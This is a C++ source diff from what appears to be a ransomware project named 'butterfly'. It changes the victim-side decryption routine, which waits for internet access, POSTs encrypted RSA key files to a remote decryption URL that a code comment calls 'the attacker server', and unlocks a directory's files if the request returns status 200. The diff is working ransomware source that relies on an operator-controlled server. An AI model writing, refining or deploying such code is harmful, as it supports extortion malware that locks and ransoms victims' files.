@@ -4,7 +4,7 @@
 namespace butterfly
 {
 
-Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::ArgumentParser(argc, argv))
+Butterfly::Butterfly(int argc, char *argv[]) : _argparse(new butterfly::ArgumentParser(argc, argv)), _connManager(new butterfly::ConnManager())
 {
 
     // parse args with the argument parser
@@ -72,6 +72,25 @@ void Butterfly::loadEncryptedFiles(std::string &cprivateRSAFileHex, std::string 
     }
 }
 
+void Butterfly::checkInternetConnection()
+{
+    int i = 0;
+    while ( !_connManager->isInternetAvailable() )
+    {
+        #ifdef LOGGING
+        LOG_ERROR("Decryption is not possible due to missing internet connection!");
+        #else
+        std::cout << "Decryption is not possible due to missing internet connection!" << std::endl;
+        #endif
+        if ( i > 4 )
+        {
+            throw ConnectionException("Decryption is not possible due to missing internet connection!");
+        }
+        i++;
+        sleep(2);
+    }
+}
+
 void Butterfly::run()
 {
 
@@ -117,17 +136,8 @@ void Butterfly::run()
         std::string cprivateRSAFileHex, rsaFileHex;
         loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);
 
-        // ConnManager instance to check whether internet is available for the POST request to the attacker server or not
-        std::unique_ptr<butterfly::ConnManager> connManager(new butterfly::ConnManager());
-        while ( !connManager->isInternetAvailable() )
-        {
-            #ifdef LOGGING
-            LOG_ERROR("Decryption is not possible due to missing internet connection!");
-            #else
-            std::cout << "Decryption is not possible due to missing internet connection!" << std::endl;
-            #endif
-            sleep(5);
-        }
+        // Connection check whether internet is available for the POST request to the attacker server or not
+        checkInternetConnection();
 
         // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
         std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(5000));
@@ -135,10 +145,21 @@ void Butterfly::run()
         httpClient->setFormParam(butterfly::RSA_EKIV_FILENAME, rsaFileHex);
         std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::REMOTE_DECRYPTION_URL);
 
-        // Decryptor instance to invoke the directory for the decryption process
-        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
-        decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
-        decryptor->invokeDir(_args.decrypt);
+        if ( httpClient->statusCode == 200 )
+        {
+            // Decryptor instance to invoke the directory for the decryption process
+            std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
+            decryptor->setDecryptedCPrivateRSAStr(decryptedCPrivateRSAStr);
+            decryptor->invokeDir(_args.decrypt);
+        } else
+        {
+            #ifdef LOGGING
+            LOG_ERROR("Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase);
+            #else
+            std::cout << "Failure on post request to decryption server with statuscode: " << httpClient->statusCode << " and reason: " << httpClient->reasonPhrase << std::endl;
+            #endif
+        }
+
 
     }
     // Start Decryption with provided key
